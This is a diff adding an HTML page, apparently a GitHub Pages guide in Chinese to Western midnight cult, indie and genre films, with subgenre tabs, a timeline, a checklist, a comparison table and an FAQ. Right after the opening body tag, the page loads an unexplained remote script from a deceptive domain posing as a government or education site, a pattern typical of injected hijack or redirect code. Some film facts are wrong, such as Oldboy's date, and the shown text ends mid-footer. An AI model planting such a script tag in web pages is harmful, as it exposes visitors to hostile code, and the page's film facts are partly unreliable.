@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="欧美午夜电影网（oumeiwuyedianyingwang-cn.github.io）是一份「午夜场」观影导航：聚焦 1980—2000 年代欧美午夜 cult 片、独立电影与类型片，按时段、影史、片单、放映礼仪四维索引，附正版观看渠道。">
+<meta name="keywords" content="欧美午夜电影网, 午夜电影, 午夜场, cult片, 独立电影, 类型片, 邪典电影, 欧美电影, 电影推荐, 片单导航, oumeiwuyedianyingwang-cn">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<title>欧美午夜电影网 - 午夜场观影导航 · Cult / 独立 / 类型片片单 | oumeiwuyedianyingwang-cn.github.io</title>
+<link rel="canonical" href="https://oumeiwuyedianyingwang-cn.github.io/">
+<style>
+:root{
+  --ink:#0d0e14; --ink2:#14151d; --card:#171923; --line:#2a2d3d; --line2:#3a3f52;
+  --txt:#d8d9e2; --mute:#8a8ea3; --neon:#ff3b7c; --cyan:#37e6d0; --amber:#ffb020; --violet:#9d6bff;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:var(--ink);color:var(--txt);line-height:1.85;overflow-x:hidden;
+  background-image:radial-gradient(circle at 12% 8%,rgba(255,59,124,.14),transparent 42%),radial-gradient(circle at 88% 22%,rgba(55,230,208,.10),transparent 40%),repeating-linear-gradient(0deg,rgba(255,255,255,.012) 0 1px,transparent 1px 3px);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none;outline:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 28px}
+.serif{font-family:Georgia,"Times New Roman",serif}
+.kicker{font-size:10.5px;letter-spacing:2.8px;font-weight:800;color:var(--neon);text-transform:uppercase}
+.btn{display:inline-flex;align-items:center;gap:9px;padding:13px 28px;border-radius:2px;font-size:13.5px;font-weight:700;letter-spacing:.7px;cursor:pointer;border:1.5px solid var(--neon);transition:.24s;position:relative;overflow:hidden}
+.btn-d{background:var(--neon);color:#0d0e14}
+.btn-d:hover{box-shadow:0 0 26px rgba(255,59,124,.65);transform:translateY(-2px)}
+.btn-o{background:transparent;color:var(--txt)}
+.btn-o:hover{background:rgba(255,59,124,.12)}
+
+/* NAV */
+.navbar{position:sticky;top:0;z-index:90;background:rgba(13,14,20,.86);backdrop-filter:blur(11px);border-bottom:1px solid var(--line)}
+.nin{display:flex;align-items:center;gap:16px;height:60px}
+.logo{display:flex;align-items:center;gap:11px;font-weight:850;font-size:17.5px;letter-spacing:.3px;font-family:Georgia,serif}
+.logo .dot{width:9px;height:9px;border-radius:50%;background:var(--neon);box-shadow:0 0 11px var(--neon);animation:bl 1.6s infinite}
+@keyframes bl{50%{opacity:.25}}
+.logo small{display:block;font-size:8.2px;color:var(--mute);letter-spacing:1.6px;font-weight:600;font-family:sans-serif}
+.nl{display:flex;gap:2px;margin-left:auto;flex-wrap:wrap}
+.nl a{font-size:12.4px;padding:7px 11px;color:var(--mute);font-weight:600}
+.nl a:hover{color:var(--neon)}
+.nl a b{color:var(--neon);font-weight:900}
+
+/* HERO : marquee + big type */
+.hero{padding:54px 0 40px;position:relative}
+.marq{display:flex;gap:44px;overflow:hidden;white-space:nowrap;font-family:Georgia,serif;font-size:15px;color:var(--mute);letter-spacing:2px;margin-bottom:26px;border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:9px 0}
+.marq span{animation:mq 26s linear infinite;flex:0 0 auto}
+.marq:hover span{animation-play-state:paused}
+@keyframes mq{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+.hero .wrap2{display:grid;grid-template-columns:1.2fr .8fr;gap:46px;align-items:center}
+h1{font-size:clamp(40px,7.6vw,78px);line-height:1.02;font-weight:900;letter-spacing:-1.6px;font-family:Georgia,serif}
+h1 .gl{background:linear-gradient(92deg,var(--neon),var(--violet) 55%,var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent}
+h1 .en{display:block;font-size:clamp(12px,1.8vw,15px);letter-spacing:5px;color:var(--mute);margin-top:15px;font-weight:700;font-family:sans-serif}
+.hero p.lede{font-size:16.5px;color:#b9bccb;margin-top:17px;max-width:620px}
+.hero p.lede strong{color:var(--amber);font-weight:800}
+.ticks{display:flex;gap:24px;margin-top:22px;flex-wrap:wrap}
+.ticks div{font-size:11.2px;letter-spacing:1.4px;color:var(--mute);font-weight:700}
+.ticks b{display:block;font-family:Georgia,serif;font-size:26px;color:var(--cyan);line-height:1.1;font-weight:900}
+.acts{display:flex;flex-wrap:wrap;gap:12px;margin-top:24px}
+/* VHS tape card */
+.vhs{position:relative;background:var(--card);border:1px solid var(--line2);border-radius:3px;padding:22px 22px 20px;transform:rotate(1.4deg);box-shadow:0 24px 50px rgba(0,0,0,.55)}
+.vhs::before{content:"VHS";position:absolute;right:16px;top:14px;font-family:Georgia,serif;font-weight:900;font-size:12px;letter-spacing:3px;color:var(--neon);border:1px solid var(--neon);padding:2px 7px;border-radius:2px}
+.vhs .spool{display:flex;gap:10px;margin-bottom:14px}
+.vhs .spool i{width:44px;height:44px;border-radius:50%;border:3px dashed var(--line2);position:relative}
+.vhs .spool i::after{content:"";position:absolute;inset:9px;border-radius:50%;background:var(--ink2);border:2px solid var(--neon)}
+.vhs h3{font-size:19px;font-family:Georgia,serif;margin-bottom:2px}
+.vhs .sub{font-size:10.4px;letter-spacing:2.4px;color:var(--cyan);font-weight:800;margin-bottom:12px}
+.vhs ul{list-style:none;font-size:12.6px;color:#c2c5d2}
+.vhs li{padding:6px 0;border-bottom:1px dotted var(--line);display:flex;gap:9px}
+.vhs li:last-child{border:none}
+.vhs li b{color:var(--amber);font-family:Georgia,serif}
+
+section{padding:74px 0}
+.sec{display:flex;align-items:flex-end;justify-content:space-between;gap:26px;flex-wrap:wrap;margin-bottom:32px}
+.sec h2{font-size:clamp(23px,3.5vw,33px);font-weight:850;margin-top:7px;font-family:Georgia,serif}
+.sec h2 em{font-style:normal;color:var(--neon)}
+.sec > p{color:var(--mute);font-size:14px;max-width:600px}
+
+/* COL1 - channel zapper (radio buttons + CSS :checked) */
+.zap{display:grid;grid-template-columns:230px 1fr;gap:0;border:1px solid var(--line2);border-radius:3px;overflow:hidden;background:var(--ink2)}
+.zap input{position:absolute;opacity:0;pointer-events:none}
+.ch{display:block;padding:16px 20px;border-bottom:1px solid var(--line);cursor:pointer;transition:.2s;border-left:3px solid transparent}
+.ch:last-of-type{border-bottom:none}
+.ch b{display:block;font-family:Georgia,serif;font-size:15.5px;letter-spacing:.5px}
+.ch span{font-size:10.6px;letter-spacing:1.6px;color:var(--mute);font-weight:700}
+.ch:hover{background:rgba(255,59,124,.07)}
+.zap input:checked + .ch{background:linear-gradient(90deg,rgba(255,59,124,.22),transparent);border-left-color:var(--neon);color:#fff}
+.zap input:checked + .ch span{color:var(--neon)}
+.pane{display:none;padding:26px 28px;align-content:center}
+.zap input:checked ~ .pane{display:block;animation:op .32s ease}
+@keyframes op{from{opacity:0;transform:translateY(7px)}to{opacity:1;transform:none}}
+.pane h3{font-size:20px;font-family:Georgia,serif;margin-bottom:4px}
+.pane .yr{font-size:10.6px;letter-spacing:2.2px;color:var(--cyan);font-weight:800}
+.pane p{font-size:13.2px;color:#b9bccb;margin-top:9px}
+.pane .films{margin-top:13px;font-size:12px;color:var(--amber);border-top:1px dashed var(--line);padding-top:10px}
+.pane .films b{color:var(--neon)}
+
+/* COL2 - timeline vertical (definition list) */
+.tl{position:relative;padding-left:30px}
+.tl::before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:linear-gradient(var(--neon),var(--violet),var(--cyan))}
+.tl .it{position:relative;margin-bottom:14px;background:var(--card);border:1px solid var(--line);border-radius:3px;padding:15px 20px;transition:.23s}
+.tl .it:hover{transform:translateX(8px);border-color:var(--neon);box-shadow:0 12px 26px rgba(0,0,0,.45)}
+.tl .it::before{content:"";position:absolute;left:-29px;top:20px;width:12px;height:12px;border-radius:50%;background:var(--ink);border:3px solid var(--neon)}
+.tl .it:hover::before{background:var(--neon);box-shadow:0 0 10px var(--neon)}
+.tl .it .yr2{font-family:Georgia,serif;font-size:12px;letter-spacing:2px;color:var(--cyan);font-weight:800}
+.tl .it h3{font-size:16px;font-family:Georgia,serif;margin:2px 0 5px}
+.tl .it p{font-size:12.4px;color:#aeb2c4}
+.tl .it .f{margin-top:8px;font-size:11.4px;color:var(--amber);font-weight:700}
+
+/* COL3 - Bingo / checklist grid (label + checkbox) */
+.bingo{display:grid;grid-template-columns:repeat(auto-fit,minmax(214px,1fr));gap:12px}
+.bg{position:relative}
+.bg input{position:absolute;opacity:0;width:0;height:0}
+.bg label{display:block;height:100%;background:var(--card);border:1px solid var(--line2);border-radius:3px;padding:18px 18px 16px;cursor:pointer;transition:.22s}
+.bg label .no{font-family:Georgia,serif;font-size:27px;font-weight:900;line-height:1;color:var(--line2)}
+.bg label h3{font-size:14.6px;margin:5px 0 6px;font-family:Georgia,serif}
+.bg label p{font-size:11.8px;color:var(--mute)}
+.bg input:checked + label{border-color:var(--cyan);background:rgba(55,230,208,.09);box-shadow:0 0 18px rgba(55,230,208,.22)}
+.bg input:checked + label .no{color:var(--cyan)}
+.bg input:checked + label h3{color:var(--cyan)}
+.bg input:checked + label::after{content:"✓ WATCHED";position:absolute;right:12px;top:14px;font-size:9.4px;letter-spacing:1.7px;color:var(--cyan);font-weight:900}
+
+/* COL4 - comparison table + sticky header */
+.dl{background:var(--ink2);border:1px solid var(--line2);border-radius:3px;overflow-x:auto;max-height:520px;overflow-y:auto}
+.dl table{width:100%;border-collapse:collapse;min-width:760px;font-size:12.9px}
+.dl th{position:sticky;top:0;background:#0a0b10;color:var(--neon);text-align:left;padding:13px 16px;font-size:10.6px;letter-spacing:2px;font-weight:800;z-index:3;border-bottom:1px solid var(--neon)}
+.dl td{padding:12px 16px;border-bottom:1px solid var(--line);vertical-align:top}
+.dl tr:hover td{background:rgba(255,59,124,.07)}
+.dl td:first-child{font-family:Georgia,serif;font-weight:800;color:var(--amber);white-space:nowrap}
+.dl .tag{display:inline-block;font-size:10.2px;padding:2px 8px;border-radius:2px;background:var(--ink);color:var(--cyan);border:1px solid var(--line2);margin-right:4px}
+
+/* COL5 - accordion */
+.faq{display:flex;flex-direction:column;gap:9px}
+details{border:1px solid var(--line2);border-radius:3px;background:var(--card);transition:.22s}
+details[open]{border-color:var(--neon);box-shadow:0 0 24px rgba(255,59,124,.18)}
+summary{cursor:pointer;padding:15px 20px;font-weight:750;font-size:14.4px;list-style:none;display:flex;gap:13px;align-items:center}
+summary::-webkit-details-marker{display:none}
+summary::before{content:"▸";color:var(--neon);font-size:15px;flex:0 0 auto}
+details[open] summary::before{content:"▾"}
+summary .no{font-family:Georgia,serif;color:var(--mute);font-size:12px;font-weight:800}
+details p{padding:0 20px 17px 53px;font-size:13.1px;color:#b4b8c7;animation:op .3s ease}
+.hl{color:var(--amber);font-weight:800}
+
+/* CTA */
+.cta{margin-top:10px;border-radius:3px;padding:54px 32px;text-align:center;background:linear-gradient(135deg,var(--ink2),#1d1126);border:1px solid var(--line2);position:relative;overflow:hidden}
+.cta::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(45deg,transparent 0 11px,rgba(255,59,124,.05) 11px 22px)}
+.cta h2{font-family:Georgia,serif;font-size:clamp(25px,3.8vw,38px);position:relative}
+.cta h2 u{text-decoration:none;color:var(--neon)}
+.cta p{color:var(--mute);max-width:640px;margin:13px auto 24px;font-size:14.4px;position:relative}
+.cta .btn-d{background:var(--neon);border-color:var(--neon);color:#0d0e14}
+
+footer{border-top:1px solid var(--line);padding:32px 0 22px;color:var(--mute);font-size:12.5px;margin-top:14px}
+.ff{display:flex;flex-wrap:wrap;justify-content:space-between;gap:16px;align-items:center}
+.fn{display:flex;flex-wrap:wrap;gap:18px}
+.fn a:hover{color:var(--neon)}
+.bread{font-size:11.5px;margin-top:13px}
+.bread a{color:var(--neon)}
+.copy{margin-top:14px;border-top:1px solid var(--line);padding-top:14px;font-size:11.5px;color:#6f7488;line-height:1.9}
+
+@media (max-width:960px){
+  .hero .wrap2{grid-template-columns:1fr}
+  .zap{grid-template-columns:1fr}
+  .ch{display:inline-flex;gap:10px;align-items:baseline;border-bottom:none;border-right:1px solid var(--line)}
+}
+@media (max-width:600px){
+  .wrap{padding:0 15px}
+  .nl a{padding:6px 5px;font-size:11.3px}
+  section{padding:54px 0}
+  .bingo{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<header class="navbar">
+  <div class="wrap nin">
+    <div class="logo"><span class="dot" aria-hidden="true"></span>欧美午夜电影网<small>OUMEIWUYEDianyingWANG-CN.GITHUB.IO</small></div>
+    <nav class="nl" aria-label="主导航">
+      <a href="#zap"><b>01</b>换台</a>
+      <a href="#age"><b>02</b>纪年</a>
+      <a href="#list"><b>03</b>清单</a>
+      <a href="#cmp"><b>04</b>对照</a>
+      <a href="#faq"><b>05</b>问答</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- HERO -->
+  <section class="hero" aria-labelledby="h1">
+    <div class="wrap">
+      <div class="marq" aria-hidden="true">
+        <span>◤ MIDNIGHT MOVIE ◢ &nbsp; CULT &nbsp;·&nbsp; INDIE &nbsp;·&nbsp; GENRE &nbsp;·&nbsp; 午夜场 &nbsp;·&nbsp; 邪典 &nbsp;·&nbsp; 独立 &nbsp;·&nbsp; 类型 ◤ MIDNIGHT MOVIE ◢ &nbsp; CULT &nbsp;·&nbsp; INDIE &nbsp;·&nbsp; GENRE &nbsp;·&nbsp; 午夜场 &nbsp;·&nbsp; 邪典 &nbsp;·&nbsp; 独立 &nbsp;·&nbsp;</span>
+      </div>
+      <div class="wrap2">
+        <div>
+          <span class="kicker">◆ 以「时段」为索引的观影导航</span>
+          <h1 id="h1">欧美<span class="gl">午夜</span>电影网<span class="en">M I D N I G H T &nbsp; S C R E E N I N G &nbsp; · &nbsp; S I N C E &nbsp; 1 9 8 0</span></h1>
+          <p class="lede">「欧美午夜电影网」（oumeiwuyedianyingwang-cn.github.io）不追院线热榜，只守<strong>午夜场</strong>：把 1980—2000 年代欧美那些"不适合白天看、也不该一个人看"的电影，按<strong>亚类型、影史纪年、必看清单、观看礼仪</strong>四维重新归档。</p>
+          <div class="ticks">
+            <div><b>4</b>个亚类型</div>
+            <div><b>6</b>个年份</div>
+            <div><b>18</b>部片</div>
+            <div><b>0</b>条资源</div>
+          </div>
+          <div class="acts">
+            <a class="btn btn-d" href="#zap">📺 换一个台</a>
+            <a class="btn btn-o" href="#list">✓ 打勾清单</a>
+          </div>
+        </div>
+        <aside class="vhs">
+          <div class="sub">WHAT IS · 什么是「午夜电影」</div>
+          <div class="spool" aria-hidden="true"><i></i><i></i></div>
+          <h3>午夜场，是一种放映制度</h3>
+          <ul>
+            <li><b>起源</b>1970 年代纽约、洛杉矶的午夜场次，为 B 级片、恐怖片、实验片提供容身之所</li>
+            <li><b>观众</b>不是"来看电影"，是"来参加一场仪式"——尖叫、跟读、穿戏服、扔东西</li>
+            <li><b>代表作</b>《洛基恐怖秀》《迷墙》《橡皮头》《低俗小说》</li>
+            <li><b>精神</b>反精致、反评级、反"正确"——<b style="color:var(--neon)">越被白天拒绝的，越在午夜生长</b></li>
+          </ul>
+        </aside>
+      </div>
+    </div>
+  </section>
+
+  <!-- COL 1 : channel zapper (radio :checked) -->
+  <section id="zap" aria-labelledby="t1">
+    <div class="wrap">
+      <div class="sec">
+        <div>
+          <span class="kicker">Column 01 · 亚类型换台</span>
+          <h2 id="t1">四个台，<em>四种深夜</em></h2>
+        </div>
+        <p>点左侧频道切换。每个亚类型配"气质—入门三部曲—为什么值得熬到凌晨"。</p>
+      </div>
+
+      <div class="zap">
+        <input type="radio" name="ch" id="c1" checked>
+        <label class="ch" for="c1"><b>BODY HORROR</b><span>身体恐怖</span></label>
+
+        <input type="radio" name="ch" id="c2">
+        <label class="ch" for="c2"><b>NEW WEIRD</b><span>新怪谭</span></label>
+
+        <input type="radio" name="ch" id="c3">
+        <label class="ch" for="c3"><b>NOIR / CRIME</b><span>新黑色犯罪</span></label>
+
+        <input type="radio" name="ch" id="c4">
+        <label class="ch" for="c4"><b>POST-PUNK</b><span>后朋克影像</span></label>
+
+        <div class="pane">
+          <div class="yr">SUBGENRE 01 · 1980s—2000s</div>
+          <h3>Body Horror 身体恐怖</h3>
+          <p>恐惧不在鬼，在<b class="hl">自己的肉</b>。变形、寄生、腐烂、手术、怀孕的异化。克罗南伯格是教父，特效化妆是信仰。</p>
+          <div class="films">🎬 入门：<b>《变蝇人》</b> 1986 ｜ <b>《感官游戏》</b> 1999 ｜ <b>《钛》</b> 2021</div>
+        </div>
+
+        <div class="pane">
+          <div class="yr">SUBGENRE 02 · 1990s—2010s</div>
+          <h3>New Weird 新怪谭</h3>
+          <p>现实裂开一道缝，从缝里长出不合逻辑的东西。不讲清楚，是这类片<b class="hl">唯一的礼貌</b>。</p>
+          <div class="films">🎬 入门：<b>《橡皮头》</b> 1977 ｜ <b>《圣山》</b> 1973 ｜ <b>《湮灭》</b> 2018</div>
+        </div>
+
+        <div class="pane">
+          <div class="yr">SUBGENRE 03 · 1990s—2000s</div>
+          <h3>Neo-Noir 新黑色犯罪</h3>
+          <p>黑色电影还魂：霓虹、雨夜、道德破产的男人、注定失败的女人。昆汀、科恩兄弟、大卫·芬奇是三个路标。</p>
+          <div class="films">🎬 入门：<b>《低俗小说》</b> 1994 ｜ <b>《冰血暴》</b> 1996 ｜ <b>《七宗罪》</b> 1995</div>
+        </div>
+
+        <div class="pane">
+          <div class="yr">SUBGENRE 04 · 1970s—1990s</div>
+          <h3>Post-Punk Cinema 后朋克影像</h3>
+          <p>电影学会了<b class="hl">不听话</b>：跳切、破音、手持、自我解构。《迷墙》《猜火车》《野蛮人》属于这一脉。</p>
+          <div class="films">🎬 入门：<b>《迷墙》</b> 1982 ｜ <b>《猜火车》</b> 1996 ｜ <b>《性、谎言和录像带》</b> 1989</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- COL 2 : vertical timeline (dl) -->
+  <section id="age" aria-labelledby="t2" style="background:linear-gradient(180deg,transparent,rgba(157,107,255,.06))">
+    <div class="wrap">
+      <div class="sec">
+        <div>
+          <span class="kicker">Column 02 · 影史纪年</span>
+          <h2 id="t2">六个年份，<em>六次转弯</em></h2>
+        </div>
+        <p>午夜电影的黄金二十年，不是平滑演进，而是六次突然的转弯。记住年份，比记住片名更有用。</p>
+      </div>
+      <div class="tl">
+
+        <div class="it">
+          <div class="yr2">1975</div>
+          <h3>《洛基恐怖秀》午夜场常驻</h3>
+          <p>一部没人看懂的音乐恐怖片，在午夜场被观众看了整整十年。它发明了"观影即参与"——跟读台词、穿戏服、扔米粒。</p>
+          <div class="f">📌 关键词：互动放映 · cult 元年</div>
+        </div>
+
+        <div class="it">
+          <div class="yr2">1977</div>
+          <h3>《橡皮头》与"看不懂"的正当性</h3>
+          <p>大卫·林奇的处女长片，全片没有一个解释。它告诉后来的独立电影：<b class="hl">你可以不解释</b>。</p>
+          <div class="f">📌 关键词：超现实主义 · 工业噪音</div>
+        </div>
+
+        <div class="it">
+          <div class="yr2">1986</div>
+          <h3>《变蝇人》把恐怖片拍成悲剧</h3>
+          <p>金·凯瑞还没红，杰夫·高布伦先变成了一只苍蝇。身体恐怖的巅峰：特效越真，同情越深。</p>
+          <div class="f">📌 关键词：身体恐怖 · 奥斯卡最佳化妆</div>
+        </div>
+
+        <div class="it">
+          <div class="yr2">1994</div>
+          <h3>《低俗小说》让非线性变成流行</h3>
+          <p>昆汀把三段故事像洗牌一样重排，全世界学了他十年。独立电影第一次在票房上赢了大片。</p>
+          <div class="f">📌 关键词：非线性叙事 · 独立电影商业化</div>
+        </div>
+
+        <div class="it">
+          <div class="yr2">1996</div>
+          <h3>《猜火车》把青春拍成一次过量</h3>
+          <p>苏格兰口音、 heroin、选择"一样糟糕的人生"。它是后朋克精神的最后一次集体发作。</p>
+          <div class="f">📌 关键词：英伦独立 · 青年虚无</div>
+        </div>
+
+        <div class="it">
+          <div class="yr2">2007</div>
+          <h3>《老男孩》之后，亚洲反哺欧美</h3>
+          <p>朴赞郁的走廊长镜头让欧美影评人集体失语。午夜场从此不再只是"欧美的深夜"，而是<b class="hl">全球的凌晨</b>。</p>
+          <div class="f">📌 关键词：亚洲极端 · 长镜头 · 翻拍潮</div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- COL 3 : bingo checklist (checkbox :checked) -->
+  <section id="list" aria-labelledby="t3">
+    <div class="wrap">
+      <div class="sec">
+        <div>
+          <span class="kicker">Column 03 · 必看清单</span>
+          <h2 id="t3">午夜观影<span class="gl">通关卡</span></h2>
+        </div>
+        <p>勾选你看过的。填满 12 格，你就不再是"看过几部电影的人"，而是"知道电影还能这样"的人。本地状态，不收集数据。</p>
+      </div>
+      <div class="bingo">
+
+        <div class="bg"><input type="checkbox" id="b1"><label for="b1"><div class="no">01</div><h3>《洛基恐怖秀》</h3><p>午夜场圣典 · 跟读台词是入场券</p></label></div>
+        <div class="bg"><input type="checkbox" id="b2"><label for="b2"><div class="no">02</div><h3>《橡皮头》</h3><p>林奇式噩梦 · 工业噪音当配乐</p></label></div>
+        <div class="bg"><input type="checkbox" id="b3"><label for="b3"><div class="no">03</div><h3>《变蝇人》</h3><p>身体恐怖 · 同情比恐惧更持久</p></label></div>
+        <div class="bg"><input type="checkbox" id="b4"><label for="b4"><div class="no">04</div><h3>《迷墙》</h3><p>平克·弗洛伊德 · 动画与真人互噬</p></label></div>
+        <div class="bg"><input type="checkbox" id="b5"><label for="b5"><div class="no">05</div><h3>《低俗小说》</h3><p>非线性叙事 · 独立片票房奇迹</p></label></div>
+        <div class="bg"><input type="checkbox" id="b6"><label for="b6"><div class="no">06</div><h3>《冰血暴》</h3><p>科恩兄弟 · 明尼苏达的雪与蠢</p></label></div>
+        <div class="bg"><input type="checkbox" id="b7"><label for="b7"><div class="no">07</div><h3>《七宗罪》</h3><p>大卫·芬奇 · 雨天、 boxes 、七宗罪</p></label></div>
+        <div class="bg"><input type="checkbox" id="b8"><label for="b8"><div class="no">08</div><h3>《猜火车》</h3><p>丹尼·博伊尔 · 选择"一样糟糕"</p></label></div>
+        <div class="bg"><input type="checkbox" id="b9"><label for="b9"><div class="no">09</div><h3>《圣山》</h3><p>佐杜洛夫斯基 · 炼金术式疯狂</p></label></div>
+        <div class="bg"><input type="checkbox" id="b10"><label for="b10"><div class="no">10</div><h3>《老男孩》</h3><p>朴赞郁 · 走廊长镜头的教科书</p></label></div>
+        <div class="bg"><input type="checkbox" id="b11"><label for="b11"><div class="no">11</div><h3>《钛》</h3><p>朱利亚·迪库诺 · 2021 金棕榈</p></label></div>
+        <div class="bg"><input type="checkbox" id="b12"><label for="b12"><div class="no">12</div><h3>《湮灭》</h3><p>亚历克斯·加兰 · 灯塔、折射、异化</p></label></div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- COL 4 : sticky-header comparison table -->
+  <section id="cmp" aria-labelledby="t4">
+    <div class="wrap">
+      <div class="sec">
+        <div>
+          <span class="kicker">Column 04 · 观看对照</span>
+          <h2 id="t4">选片<span class="gl">对照表</span></h2>
+        </div>
+        <p>横向可滚动、表头吸顶。不知道看哪部时，先问自己：<b class="hl">今晚想被吓到，还是想被弄糊涂？</b></p>
+      </div>
+      <div class="dl">
+        <table>
+          <thead>
+            <tr><th style="width:170px">想要的感觉</th><th style="width:210px">推荐</th><th>为什么是它</th><th style="width:190px">同类可换</th></tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>想被恶心</td>
+              <td>《变蝇人》</td>
+              <td>身体恐怖的教科书。它可怕，是因为你在替主角感到疼。</td>
+              <td><span class="tag">《怪形》</span><span class="tag">《感官游戏》</span></td>
+            </tr>
+            <tr>
+              <td>想看不懂</td>
+              <td>《橡皮头》</td>
+              <td>全片拒绝解释。看完的困惑，本身就是一次审美体验。</td>
+              <td><span class="tag">《圣山》</span><span class="tag">《内陆帝国》</span></td>
+            </tr>
+            <tr>
+              <td>想被节奏带走</td>
+              <td>《低俗小说》</td>
+              <td>三段故事洗牌重排，对白比情节更好看。学叙事的第一课。</td>
+              <td><span class="tag">《落水狗》</span><span class="tag">《记忆碎片》</span></td>
+            </tr>
+            <tr>
+              <td>想冷</td>
+              <td>《冰血暴》</td>
+              <td>雪地里的人性，蠢比坏多。科恩兄弟最"正常"的一部，也最准。</td>
+              <td><span class="tag">《老无所依》</span><span class="tag">《三块广告牌》</span></td>
+            </tr>
+            <tr>
+              <td>想被音乐击中</td>
+              <td>《迷墙》</td>
+              <td>整张专辑就是一部电影。动画段落是影史被引用最多的画面之一。</td>
+              <td><span class="tag">《猜火车》</span><span class="tag">《命运先生》</span></td>
+            </tr>
+            <tr>
+              <td>想被反转</td>
+              <td>《老男孩》</td>
+              <td>走廊长镜头、结局的反转，都是被后来十年反复抄袭的原创。</td>
+              <td><span class="tag">《亲切的金子》</span><span class="tag">《复仇》</span></td>
+            </tr>
+            <tr>
+              <td>想被美到不安</td>
+              <td>《湮灭》</td>
+              <td>灯塔、折射、自我复制。科幻外壳下是一则关于"改变"的寓言。</td>
+              <td><span class="tag">《降临》</span><span class="tag">《机械姬》</span></td>
+            </tr>
+            <tr>
+              <td>想被弄哭</td>
+              <td>《钛》</td>
+              <td>金棕榈。一个关于"被爱"的故事，装在一具变形的身体里。</td>
+              <td><span class="tag">《悲惨三角》</span><span class="tag">《鹿皮》</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- COL 5 : accordion -->
+  <section id="faq" aria-labelledby="t5">
+    <div class="wrap">
+      <div class="sec">
+        <div>
+          <span class="kicker">Column 05 · 常见问题</span>
+          <h2 id="t5">关于<em>「午夜」</em>的六个问题</h2>
+        </div>
+        <p>点击展开。答案尽量短，长话留给电影。</p>
+      </div>
+      <div class="faq">
+
+        <details open>
+          <summary><span class="no">Q1</span>为什么叫"欧美午夜电影网"？</summary>
+          <p>"午夜电影"（Midnight Movie）原本是一种<b class="hl">放映制度</b>：1970 年代起，纽约、洛杉矶的部分影院在午夜加场，专门放映被白天院线拒绝的 B 级片、恐怖片与实验片。《洛基恐怖秀》在一个影院连映了整整十年。本站立在这个传统上，只做<b>欧美 1980—2000 年代的午夜场片单与观影指引</b>。</p>
+        </details>
+
+        <details>
+          <summary><span class="no">Q2</span>"午夜电影"是色情片吗？</summary>
+          <p><b class="hl">不是。</b>这是最常见也最有害的误解。午夜电影的核心是<b>反主流、低预算、高作者性</b>，涵盖身体恐怖、新怪谭、新黑色、后朋克影像、实验动画等亚类型。它可能在分级上是 R 级或 NC-17 级，但"限制级"≠"色情"。本站所有片单均按<b>亚类型与作者</b>归档，不按尺度归档，也<b>不收录、不推荐任何色情内容</b>。</p>
+        </details>
+
+        <details>
+          <summary><span class="no">Q3</span>Cult 片、B 级片、午夜电影，区别在哪？</summary>
+          <p>三者有重叠，但不等同：<b>B 级片</b>是<b>预算</b>概念（低成本、二线班底）；<b>Cult 片</b>是<b>受众</b>概念（小众、狂热、反复观看、形成仪式）；<b>午夜电影</b>是<b>放映</b>概念（时段与场合）。一部片可以三者皆是，也可以只属其一。例如《大白鲨》是 B 级片但不是 Cult；《洛基恐怖秀》三者皆是；《2001 太空漫游》是 Cult 但既不是 B 级片也不是午夜电影。</p>
+        </details>
+
+        <details>
+          <summary><span class="no">Q4</span>新手从哪一部开始？</summary>
+          <p>建议顺序：<b>《低俗小说》→《冰血暴》→《变蝇人》→《橡皮头》→《老男孩》</b>。前两步是"好看的怪"，中间两步是"难看但值得"，最后一步是"看完会想重看"。不要从《圣山》开始——它会劝退你，而它不是用来被劝退的。</p>
+        </details>
+
+        <details>
+          <summary><span class="no">Q5</span>为什么推荐的大多是老片？</summary>
+          <p>因为<b class="hl">午夜场是一种已经消失的场合</b>。流媒体时代，电影不再需要"午夜"才能被看见，也就失去了那种"一群人在黑暗里一起失控"的仪式感。1980—2000 是最后一个还有实体午夜场的二十年，所以片单集中在这里。近年的《钛》《湮灭》《悲惨三角》是这条血脉的延续，也已收入清单。</p>
+        </details>
+
+        <details>
+          <summary><span class="no">Q6</span>在哪里可以合法观看这些影片？</summary>
+          <p>本站<b class="hl">不提供、不托管、不链接任何影视资源</b>，仅做索引、评论与研究性介绍。请通过所在地区的正版流媒体、院线、正规影碟（Criterion Collection / Arrow Video 等修复版尤佳）或公共图书馆渠道观看，尊重创作者劳动与知识产权。若某片在您所在地区无合法渠道，请等待官方引进或修复发行，不要转向侵权来源。</p>
+        </details>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- CTA -->
+  <section aria-labelledby="c1">
+    <div class="wrap">
+      <div class="cta">
+        <h2 id="c1">把<b><u>失眠</u></b>，<br>过成一场<b><u>私人放映</u></b></h2>
+        <p>订阅「午夜场」邮件：每月一个亚类型、三部片、一段影史背景、一份正版渠道清单。无广告、不催更、随时可退。适合凌晨两点的人。</p>
+        <a class="btn btn-d" href="#" rel="nofollow">📮 订阅午夜场周报</a>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="ff">
+      <div>
+        <strong style="color:var(--txt);font-family:Georgia,serif;font-size:15px">➤ 欧美午夜电影网</strong> · <span>oumeiwuyedianyingwang-cn.github.io</span>
